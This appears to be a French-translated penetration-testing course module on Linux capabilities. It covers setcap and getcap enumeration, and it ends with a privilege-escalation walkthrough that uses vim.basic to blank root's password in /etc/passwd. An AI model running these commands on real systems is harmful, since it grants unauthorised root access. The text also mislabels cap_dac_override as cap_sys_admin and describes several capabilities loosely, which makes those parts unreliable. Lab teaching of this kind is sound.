Capacités
=========

* * * * *

Les fonctionnalités Linux sont une fonctionnalité de sécurité du système d'exploitation Linux qui permet d'accorder des privilèges spécifiques aux processus, leur permettant d'effectuer des actions spécifiques qui seraient autrement restreintes. Cela permet un contrôle plus précis sur les processus qui ont accès à certains privilèges, ce qui le rend plus sûr que le modèle Unix traditionnel d'octroi de privilèges aux utilisateurs et aux groupes.

Cependant, comme toute fonctionnalité de sécurité, les capacités de Linux ne sont pas invulnérables et peuvent être exploitées par des attaquants. Une vulnérabilité courante consiste à utiliser des capacités pour accorder des privilèges à des processus qui ne sont pas correctement mis en bac à sable ou isolés des autres processus, ce qui nous permet d'élever leurs privilèges et d'accéder à des informations sensibles ou d'effectuer des actions non autorisées.

Une autre vulnérabilité potentielle est la mauvaise utilisation ou la surutilisation des capacités, qui peut donner aux processus plus de privilèges qu'ils n'en ont besoin. Cela peut créer des risques de sécurité inutiles, car nous pourrions exploiter ces privilèges pour accéder à des informations sensibles ou effectuer des actions non autorisées.

Dans l'ensemble, les fonctionnalités de Linux peuvent être une fonctionnalité de sécurité pratique, mais elles doivent être utilisées avec précaution et correctement pour éviter les vulnérabilités et les exploits potentiels.

La définition des fonctionnalités implique l'utilisation des outils et des commandes appropriés pour attribuer des fonctionnalités spécifiques aux exécutables ou aux programmes. Dans Ubuntu, par exemple, nous pouvons utiliser la `setcap`commande pour définir des capacités pour des exécutables spécifiques. Cette commande nous permet de spécifier la capacité que nous voulons définir et la valeur que nous voulons attribuer.

Par exemple, nous pourrions utiliser la commande suivante pour définir la `cap_net_bind_service`capacité d'un exécutable :

#### Définir la capacité

  Définir la capacité

```
dsgsec@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

```

Lorsque les capacités sont définies pour un binaire, cela signifie que le binaire sera capable d'effectuer des actions spécifiques qu'il ne pourrait pas effectuer sans les capacités. Par exemple, si la `cap_net_bind_service`capacité est définie pour un binaire, le binaire pourra se lier aux ports réseau, ce qui est un privilège généralement restreint.

Certaines fonctionnalités, telles que `cap_sys_admin`, qui permettent à un exécutable d'effectuer des actions avec des privilèges administratifs, peuvent être dangereuses si elles ne sont pas utilisées correctement. Par exemple, nous pourrions les exploiter pour augmenter leurs privilèges, accéder à des informations sensibles ou effectuer des actions non autorisées. Par conséquent, il est crucial de définir ces types de fonctionnalités pour des exécutables correctement mis en bac à sable et isolés et d'éviter de les accorder inutilement.

| Aptitude | Description |
| --- | --- |
| `cap_sys_admin` | Permet d'effectuer des actions avec des privilèges administratifs, telles que la modification des fichiers système ou la modification des paramètres système. |
| `cap_sys_chroot` | Permet de changer le répertoire racine du processus en cours, lui permettant d'accéder à des fichiers et répertoires qui seraient autrement inaccessibles. |
| `cap_sys_ptrace` | Permet de s'attacher et de déboguer d'autres processus, lui permettant potentiellement d'accéder à des informations sensibles ou de modifier le comportement d'autres processus. |
| `cap_sys_nice` | Permet d'augmenter ou de diminuer la priorité des processus, lui permettant potentiellement d'accéder à des ressources qui seraient autrement restreintes. |
| `cap_sys_time` | Permet de modifier l'horloge système, lui permettant potentiellement de manipuler les horodatages ou de faire en sorte que d'autres processus se comportent de manière inattendue. |
| `cap_sys_resource` | Permet de modifier les limites des ressources système, telles que le nombre maximal de descripteurs de fichiers ouverts ou la quantité maximale de mémoire pouvant être allouée. |
| `cap_sys_module` | Permet de charger et de décharger des modules du noyau, lui permettant potentiellement de modifier le comportement du système d'exploitation ou d'accéder à des informations sensibles. |
| `cap_net_bind_service` | Permet de se lier aux ports réseau, lui permettant potentiellement d'accéder à des informations sensibles ou d'effectuer des actions non autorisées. |

Lorsqu'un binaire est exécuté avec des capacités, il peut effectuer les actions autorisées par les capacités. Cependant, il ne pourra pas effectuer d'actions non autorisées par les capacités. Cela permet un contrôle plus précis des privilèges du binaire et peut aider à prévenir les vulnérabilités de sécurité et l'accès non autorisé aux informations sensibles.

Lorsque vous utilisez la `setcap`commande pour définir les capacités d'un exécutable sous Linux, nous devons spécifier la capacité que nous voulons définir et la valeur que nous voulons attribuer. Les valeurs que nous utilisons dépendront de la capacité spécifique que nous définissons et des privilèges que nous voulons accorder à l'exécutable.

Voici quelques exemples de valeurs que nous pouvons utiliser avec la `setcap`commande, ainsi qu'une brève description de ce qu'elles font :

| Valeurs de capacité | Description |
| --- | --- |
| `=` | Cette valeur définit la capacité spécifiée pour l'exécutable, mais n'accorde aucun privilège. Cela peut être utile si nous voulons effacer une capacité précédemment définie pour l'exécutable. |
| `+ep` | Cette valeur accorde les privilèges effectifs et autorisés pour la capacité spécifiée à l'exécutable. Cela permet à l'exécutable d'effectuer les actions autorisées par la capacité, mais ne lui permet pas d'effectuer des actions qui ne sont pas autorisées par la capacité. |
| `+ei` | Cette valeur accorde à l'exécutable des privilèges suffisants et héritables pour la capacité spécifiée. Cela permet à l'exécutable d'effectuer les actions autorisées par la capacité et aux processus enfants engendrés par l'exécutable d'hériter de la capacité et d'effectuer les mêmes actions. |
| `+p` | Cette valeur accorde les privilèges autorisés pour la capacité spécifiée à l'exécutable. Cela permet à l'exécutable d'effectuer les actions autorisées par la capacité, mais ne lui permet pas d'effectuer des actions qui ne sont pas autorisées par la capacité. Cela peut être utile si nous voulons accorder la capacité à l'exécutable mais l'empêcher d'hériter de la capacité ou de permettre aux processus enfants d'en hériter. |

Plusieurs fonctionnalités Linux peuvent être utilisées pour élever les privilèges d'un utilisateur à `root`, notamment :

| Aptitude | Description |
| --- | --- |
| `CAP_SETUID` | Permet à un processus de définir son ID utilisateur effectif, qui peut être utilisé pour obtenir les privilèges d'un autre utilisateur, y compris l' `root`utilisateur. |
| `CAP_SETGID` | Permet de définir son ID de groupe effectif, qui peut être utilisé pour obtenir les privilèges d'un autre groupe, y compris le `root`groupe. |
| `CAP_SYS_ADMIN` | Cette fonctionnalité fournit une large gamme de privilèges administratifs, y compris la possibilité d'effectuer de nombreuses actions réservées à l' `root`utilisateur, telles que la modification des paramètres système et le montage et le démontage des systèmes de fichiers. |

* * * * *

Capacités d'énumération
-----------------------

Il est important de noter que ces fonctionnalités doivent être utilisées avec prudence et uniquement accordées aux processus de confiance, car elles peuvent être utilisées à mauvais escient pour obtenir un accès non autorisé au système. Pour énumérer toutes les fonctionnalités existantes pour tous les exécutables binaires existants sur un système Linux, nous pouvons utiliser la commande suivante :

#### Capacités d'énumération

  Capacités d'énumération

```
dsgsec@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep

```

Ce one-liner utilise la `find`commande pour rechercher tous les exécutables binaires dans les répertoires où ils se trouvent généralement, puis utilise le `-exec`drapeau pour exécuter la `getcap`commande sur chacun, montrant les capacités qui ont été définies pour ce binaire. La sortie de cette commande affichera une liste de tous les exécutables binaires sur le système, ainsi que les capacités qui ont été définies pour chacun.

* * * * *

Exploitation
------------

Si nous avons obtenu l'accès au système avec un compte à faible privilège mais que nous n'en avons pas la `cap_sys_admin`capacité :

#### Exploitation des capacités

  Exploitation des capacités

```
dsgsec@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip

```

Par exemple, le `/usr/bin/vim.basic`binaire est exécuté sans privilèges spéciaux, comme avec `sudo`. Cependant, étant donné que le fichier binaire possède les `cap_sys_admin`fonctionnalités définies, il peut élever les privilèges de l'utilisateur qui l'exécute. Cela permettrait au testeur d'intrusion d'acquérir la `cap_sys_admin`capacité et d'effectuer des tâches qui nécessitent cette capacité.

Examinons le `/etc/passwd`fichier où l'utilisateur `root`est spécifié :
Exploitation des capacités

```
dsgsec@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash

```

Nous pouvons utiliser la `cap_sys_admin`capacité du `/usr/bin/vim`binaire pour modifier un fichier système :

  Exploitation des capacités

```
dsgsec@htb[/htb]$ /usr/bin/vim.basic /etc/passwd

```

Nous pouvons également effectuer ces modifications en mode non interactif :

  Exploitation des capacités

```
dsgsec@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
dsgsec@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash

```

Maintenant, nous pouvons voir que le `x`dans cette ligne a disparu, ce qui signifie que nous pouvons utiliser la commande `su`pour nous connecter en tant que root sans qu'on nous demande le mot de passe.
